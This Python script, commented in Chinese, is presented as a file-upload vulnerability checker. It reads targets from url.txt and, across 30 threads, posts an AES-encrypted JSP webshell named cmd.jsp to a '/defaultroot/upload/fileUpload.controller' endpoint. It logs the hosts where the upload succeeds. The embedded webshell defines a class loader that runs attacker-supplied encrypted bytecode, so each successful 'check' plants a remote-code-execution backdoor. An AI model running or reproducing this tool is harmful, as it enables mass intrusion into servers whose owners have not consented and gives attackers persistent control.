import requests
import urllib3
from urllib.parse import urlparse
import concurrent.futures
import threading
import time

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 创建线程锁用于安全写入文件
file_lock = threading.Lock()

def check_vulnerability(url):
    """
    检测文件上传漏洞
    """
    try:
        # 确保URL格式正确
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # 解析URL获取主机信息
        parsed_url = urlparse(url)
        host = parsed_url.netloc
        base_url = f"{parsed_url.scheme}://{host}"
        
        # 目标路径
        target_url = f"{base_url}/defaultroot/upload/fileUpload.controller"
        
        # 构造请求头
        headers = {
            'Host': host,
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Content-Type': 'multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0'
        }
        
        # 构造请求体
        boundary = 'KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0'
        
        # JSP webshell内容
        jsp_content = '''<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    private byte[] Decrypt(byte[] data) throws Exception
    {
        String k="e45e329feb5d925b";
        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
        byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
        return c.doFinal(decodebs);

    }
%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%>
        <%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
    %>'''
        
        # 构造multipart/form-data数据
        body = f"""--{boundary}
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

{jsp_content}
--{boundary}--"""
        
        # 发送POST请求
        response = requests.post(
            target_url,
            headers=headers,
            data=body,
            verify=False,
            timeout=10
        )
        
        # 检查响应
        if response.status_code == 200:
            # 检查响应内容是否包含成功特征
            response_text = response.text
            if 'result":"success' in response_text or 'fileSize' in response_text:
                print(f"[+] 漏洞存在: {target_url}")
                print(f"    响应内容: {response_text.strip()}")
                
                # 使用线程锁安全写入文件
                with file_lock:
                    with open('result.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{target_url}\n")
                        f.write(f"响应: {response_text.strip()}\n")
                        f.write("-" * 50 + "\n")
                
                return True, target_url
            else:
                print(f"[-] 状态码200但无漏洞特征: {target_url}")
        else:
            print(f"[-] 状态码非200: {response.status_code} - {target_url}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {url} - {str(e)}")
    except Exception as e:
        print(f"[!] 检测过程中出错: {url} - {str(e)}")
    
    return False, url

def worker(url):
    """
    工作线程函数
    """
    return check_vulnerability(url)

def main():
    """
    主函数
    """
    print("开始检测文件上传漏洞...")
    print("=" * 60)
    
    try:
        # 读取URL列表
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("未在url.txt中找到有效的URL")
            return
        
        print(f"共找到 {len(urls)} 个URL待检测")
        
        # 清空或创建结果文件
        open('result.txt', 'w', encoding='utf-8').close()
        
        vulnerable_count = 0
        start_time = time.time()
        
        # 设置并发线程数（可根据需要调整）
        max_workers = 30
        
        print(f"使用并发检测，线程数: {max_workers}")
        
        # 使用线程池并发执行
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(worker, url): url for url in urls}
            
            # 处理完成的任务
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result, target_url = future.result()
                    if result:
                        vulnerable_count += 1
                except Exception as e:
                    print(f"[!] 处理 {url} 时发生异常: {str(e)}")
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print("\n" + "=" * 60)
        print(f"检测完成!")
        print(f"总检测数: {len(urls)}")
        print(f"存在漏洞: {vulnerable_count}")
        print(f"耗时: {elapsed_time:.2f} 秒")
        print(f"平均速度: {len(urls)/elapsed_time:.2f} 个/秒")
        print(f"结果已保存到: result.txt")
        
    except FileNotFoundError:
        print("[!] 未找到url.txt文件，请确保文件存在")
    except Exception as e:
        print(f"[!] 程序执行出错: {str(e)}")

if __name__ == "__main__":
    main()